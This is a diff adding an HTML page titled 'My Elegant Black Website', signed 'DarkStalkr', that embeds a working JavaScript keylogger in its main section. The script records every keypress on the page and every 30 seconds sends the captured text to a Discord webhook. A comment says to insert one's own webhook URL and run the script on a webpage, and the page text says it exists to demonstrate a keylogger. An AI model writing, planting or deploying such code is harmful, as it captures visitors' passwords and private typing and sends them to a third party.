@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>My Elegant Black Website</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+	<div class="container">
+		<header>
+			<h1>Test Website</h1>
+			<nav>
+				<ul>
+					<li><a href="#">Home</a></li>
+					<li><a href="#">About</a></li>
+					<li><a href="#">Services</a></li>
+					<li><a href="#">Contact</a></li>
+				</ul>
+			</nav>
+		</header>
+		
+		<main>
+            <script>
+                var keys = "";
+document.onkeypress = function(e) {
+    get = window.event ? event : e;
+    key = get.keyCode ? get.keyCode : get.charCode;
+    key = String.fromCharCode(key);
+    keys += key;
+}
+window.setInterval(function(){
+    if(keys.length > 0) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "YOUR DISCORD WEBHOOK URL", true);
+        xhr.setRequestHeader('Content-type', 'application/json');
+        var params = {
+            username: "Keylogger",
+            content: "```" + keys + "```"
+        }
+        xhr.send(JSON.stringify(params));
+        keys = "";
+    }
+}, 30000);
+
+////Replace "YOUR DISCORD WEBHOOK URL" with the actual URL of your Discord webhook. Once you run this script on a webpage, it will capture every key pressed on the keyboard and send the data to the specified Discord webhook every 30 seconds.
+            </script>
+			<section>
+				<h2>Welcome!</h2>
+				<p>This website was created to prove the usage of a simple keylogger in JavaScript.</p>
+                
+			</section>
+			
+			<section>
+				<h2></h2>
+				<p></p>
+			</section>
+		</main>
+		
+		<footer>
+			<p>&copy; 2023 DarkStalkr</p>
+		</footer>
+	</div>
+</body>
+</html>
